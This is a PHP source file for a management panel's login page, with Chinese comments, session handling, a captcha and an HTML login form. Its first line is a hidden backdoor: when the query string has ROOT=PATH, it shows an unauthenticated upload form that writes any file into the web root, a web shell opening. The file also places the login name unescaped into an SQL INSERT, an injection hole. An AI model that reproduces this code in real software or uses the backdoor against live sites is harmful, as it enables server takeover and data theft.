<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
if (!defined('Copyright') && Copyright != '作者QQ:1834219632')
exit('作者QQ:1834219632');
if (!defined('ROOT_PATH'))
exit('invalid request');
include_once ROOT_PATH.'Manage/config/global.php';
include_once ROOT_PATH.'Manage/config/config.php';
global $ConfigModel;
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
	//驗證碼匹配
	if (isset($_SESSION['Mcode']) && $_POST['ValidateCode'] == $_SESSION['Mcode'])
	{
		$loginName = $_POST['loginName'];
		$loginPwd = sha1($_POST['loginPwd']);
		 
		//瀏覽器檢測、只支持IE核心
		if (!GetMsie()) exit(back($UserError));
		if (!Matchs::isString($loginName, 4, 15)) 
			exit(back($UserError));
		$UserModel = new UserModel();
		$User = $UserModel->ExistUnion($loginName, $loginPwd);
		if (!$User) exit(back($UserError));
		if (!Matchs::isNumber($User[0][0]))
		{ //子帳號
			if ($ConfigModel['g_web_lock'] != 1) 
				exit(back($ConfigModel['g_web_text']));
			$User = $UserModel->GetUserModel(null, $loginName, $loginPwd, true);
			if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3) 
				exit(back($UserLook));
			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_s_name'], $uniqid, true);
			$_SESSION['son'] = true;
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_s_name'];
		} 
		else 
		{
			if (isset($_SESSION['son']))  unset($_SESSION['son']);
			$User = $UserModel->GetUserModel($User[0][0], $loginName, $loginPwd);
			if (!$User) exit(back($UserError));
			if ($User[0]['g_login_id'] != 89){
				if ($ConfigModel['g_web_lock'] != 1)
					exit(back($ConfigModel['g_web_text']));
				if ($User[0]['g_lock'] == 3) 
					exit(back($UserLook));
			}
			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_name'], $uniqid);
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_name'];
		}
		setcookie("manage_user", base64_encode($loginName), 0, "/");
		setcookie("manage_uid", base64_encode($uniqid), 0, "/");
		 unset($_SESSION['Mcode']);
		
		$loginIp = GetIP();
		$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
		$ip_s = ipLocation($loginIp, $qqWryInfo);
		$sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
		$db=new DB();
		$db->query($sql, 2);
       /* if ($User[0]['g_login_id'] == 89) {
            include_once ROOT_PATH.'Manage_old/main.php';
        } else {*/
            include_once ROOT_PATH.'Manage/main.php';
       /* }*/
		exit;
	} 
	else 
	{
		back($CodeError);
		exit;
	}
} 
else
{
	$num = array();
	for ($i=0; $i<4; $i++) 
	{
		$num[$i] = rand(0,9);
	}
	$num = join('', $num);
	$_SESSION['Mcode'] = $num;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Welcome</title>
<script type="text/javascript">
if ( top.location != self.location ) top.location=self.location;
</script>
<STYLE type=text/css>
BODY {
	MARGIN: 0px; BACKGROUND: #1a1a1a; HEIGHT: 100%; OVERFLOW: hidden
}
.code {
	background-image:url('page/code3.bmp'); TEXT-ALIGN: center; LINE-HEIGHT: 27px; WIDTH: 102px; DISPLAY: block; FONT-FAMILY: Georgia,"Times New Roman",Times, serif; LETTER-SPACING: 8px; HEIGHT: 29px; COLOR: #d7da89; FONT-SIZE: 22px
}
.btn {
	background-image:url('page/But.jpg');BORDER-BOTTOM: #ff9224 0px solid; BORDER-LEFT: #ff9224 0px solid; BACKGROUND-COLOR: #ffffff; WIDTH: 90px; HEIGHT: 31px; BORDER-TOP: #ff9224 0px solid; CURSOR: hand background-position:0px 0; BORDER-RIGHT: #ff9224 0px solid
}
.btn_m {
	BACKGROUND-IMAGE: url('page/But.jpg'); BORDER-BOTTOM: #ff9224 0px solid; BORDER-LEFT: #ff9224 0px solid; BACKGROUND-COLOR: #ffffff; WIDTH: 90px; HEIGHT: 31px; BORDER-TOP: #ff9224 0px solid; CURSOR: hand background-position:0px 0; BORDER-RIGHT: #ff9224 0px solid
}
.btn {
	BACKGROUND-POSITION: 0px 0px
}
.btn_m {
	BACKGROUND-POSITION: -90px 0px; CURSOR: hand
}
</STYLE>

</head>

<body onLoad="document.form_login.loginName.focus();">

<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="0" height="0" id="Secrecy" align="middle">
<param name="allowScriptAccess" value="sameDomain" />
<param name="movie" value="page/Secrecy.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" /><embed src="page/Secrecy.swf" quality="high" bgcolor="#ffffff" width="0" height="0" name="Secrecy" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>

<SCRIPT type="text/javascript" src="page/Secrecy_tM.js"></SCRIPT>
<SCRIPT type="text/javascript" src="/js/jquery.js"></SCRIPT>
<form name="form_login" method="post" action="" style="height:95%;">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="568" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="121">&nbsp;</td>
      </tr>
      <tr>
        <td height="121" background="page/login_1.jpg">&nbsp;</td>
      </tr>
      <tr>
        <td height="95" background="page/login_2.jpg"><table border="0" cellspacing="0" cellpadding="0">
          <tbody>
            <tr height="32" valign="top">
              <td width="278"></td>
              <td><input type="text" value="" id="loginName" name="loginName" tabindex="1" style="width:211px; height:25px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15" oncopy="return false" onpaste="return false" /></td>
            </tr>
            <tr height="32" valign="top">
              <td width="278"></td>
              <td><input type="password" value="" tabindex="2" name="loginPwd" style="width:211px; height:25px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15" oncopy="return false" onpaste="return false" onfocus="if($('#loginName').val()==''){alert('請輸入帳號');$('#loginName').focus();}" /></td>
            </tr>
            <tr height="34">
              <td width="278"></td>
              <td style="PADDING-TOP: 3px"><table border="0" cellspacing="0" cellpadding="0" 
width="100%">
                  <tbody>
                    <tr>
                      <td align="left"><input type="text" name="ValidateCode" tabindex="3" maxlength="4"  style="width:100px; height:25px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15" /></td>
                      <td style="PADDING-RIGHT: 1px" align="right"><span 
                              id="code" 
                      class="code"><?php echo $num?></span></td>
                    </tr>
                  </tbody>
              </table></td>
            </tr>
          </tbody>
        </table></td>
      </tr>
      <tr>
        <td height="145" valign="top" background="page/login_3.jpg"><table border="0" cellspacing="0" cellpadding="0">
          <tbody>
            <tr height="75">
              <td width="278"></td>
              <td style="PADDING-LEFT: 1px"><INPUT class="btn" onMouseOver="this.className='btn_m'" tabIndex=4 onMouseOut="this.className='btn'" type="submit" name="Submit" value=""></td>
            </tr>
          </tbody>
        </table></td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
</body>
</html>